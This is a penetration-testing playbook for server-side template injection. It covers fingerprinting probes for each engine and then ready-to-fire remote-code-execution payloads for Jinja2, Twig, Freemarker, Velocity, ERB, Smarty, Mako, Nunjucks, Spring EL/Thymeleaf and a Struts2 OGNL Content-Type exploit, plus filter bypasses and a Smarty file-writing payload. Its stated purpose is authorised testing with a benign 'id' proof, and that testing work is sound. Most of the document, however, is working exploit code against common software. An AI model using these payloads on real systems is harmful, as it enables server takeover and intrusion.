# Server-Side Template Injection (SSTI) — per-engine RCE ladder

User input reaches a template engine that renders it server-side. The finding is
**not** `{{7*7}} -> 49` — that's the fingerprint (rung 0). The finding is a
reflected `id`/`whoami` from an engine-specific gadget. Surfaces: email/report/PDF
template editors, "custom template", notification/invoice builders, error/redirect
messages that echo input, name/subject fields rendered into a template, Liquid/
Handlebars in the UI, rule/formula engines.

## Contents
- Step 1 — Detect + fingerprint the engine
- Step 2 — Engine-specific RCE: Jinja2, Twig, Freemarker, Velocity, ERB/Erubis, Smarty, Mako, Nunjucks, Spring EL/Thymeleaf/OGNL
- Step 3 — Prove + stop
- Oracle / false positives

## Step 1 — Detect + fingerprint the engine

Fire the polyglot detection probes and watch for arithmetic evaluation:

| Probe | Evaluates in |
|---|---|
| `{{7*7}}` -> `49` | Jinja2, Twig, Nunjucks, Liquid(no math), Django(no) |
| `${7*7}` -> `49` | Freemarker, Velocity, Spring EL, JSP EL, Thymeleaf |
| `#{7*7}` -> `49` | Ruby (Slim/Haml), JSF EL |
| `<%= 7*7 %>` -> `49` | ERB (Ruby), EJS (Node) |
| `{7*7}` -> `49` | Smarty, Tornado |
| `@(7*7)` -> `49` | Razor (.NET) |

Then disambiguate the `{{ }}` family:

- `{{7*'7'}}` -> **`7777777`** = **Jinja2** (Python string repeat); -> **`49`** =
  **Twig** (numeric). 
- `{{7*'7'}}` errors + `{{'a'~'b'}}` -> `ab` = Twig/Nunjucks concat.
- `${7*7}` that also evals `${"z".getClass()}` -> Java (Freemarker/Velocity/Spring).

Also read the **error message** — a template exception almost always names the
engine (`jinja2.exceptions`, `freemarker.core`, `org.apache.velocity`,
`Twig\Error`).

## Step 2 — Engine-specific RCE (reflect a benign `id`)

### Jinja2 (Python / Flask / Django-Jinja)
```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}   # Flask
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Filtered `.`/`_`? Use attribute-bracket + `|attr`: `{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}`
or `{{ request['application']['\x5f\x5fglobals\x5f\x5f'] }}`.

### Twig (PHP / Symfony / Drupal)
```twig
{{ ['id'] | filter('system') }}
{{ ['id', ''] | sort('system') | join }}
{{ ['id'] | map('system') | join }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}   # <=1.x
{{ attribute(_self.env.getExtension('Twig\\Extension\\CoreExtension'),'getEscaper') }}
```

### Freemarker (Java)
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${ "freemarker.template.utility.Execute"?new()("id") }
${ product.getClass().getProtectionDomain().getCodeSource() }        # sandbox recon
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","id").start()}
```

### Velocity (Java)
```velocity
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### ERB / Erubis (Ruby / Rails)
```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= `id`; %>
```
Slim/Haml: `#{ `id` }` ; Ruby-interpolation sinks accept `#{IO.popen('id').read}`.

### Smarty (PHP)
```smarty
{system('id')}
{php}system('id');{/php}         # <=3.1.x with {php} enabled
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```

### Mako (Python)
```mako
${ __import__('os').popen('id').read() }
<%! import os %>${ os.popen('id').read() }
<% import os %>${ os.popen('id').read() }
```

### Nunjucks (Node)
```nunjucks
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")() }}
```

### Spring EL / Thymeleaf / OGNL (Java)
```
${ T(java.lang.Runtime).getRuntime().exec('id') }
*{ T(java.lang.Runtime).getRuntime().exec('id') }
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x     # Thymeleaf expression preprocessing
```
Struts2 OGNL (CVE-2017-5638, `Content-Type` header sink):
```
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#out=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

## Step 3 — Prove + stop

- Fire the engine's gadget with `id` / `whoami` / `hostname`. The reflected uid
  output is the finding (rung 1, non-mutating).
- If the engine is sandboxed and no gadget escapes, you have **reflected `49`
  only** -> Medium at best; state the sandbox held and rotate. Do not claim RCE
  without a fired command.
- Capture execution context (uid, host, container). Do NOT read files beyond a
  single proof or take a shell.

## Oracle / false positives

- **Confirm:** engine-specific gadget returns `id` output; error message names the
  engine; `{{7*'7'}}` differential pins Jinja vs Twig.
- **Not a finding:** `{{7*7}}` rendered **literally** (no eval); the expression
  evaluates **client-side only** (that's DOM XSS, not SSTI); the engine only
  exposes safe variables and every RCE gadget is blocked (Medium reflected-eval, no
  RCE); marker reflected without evaluation.
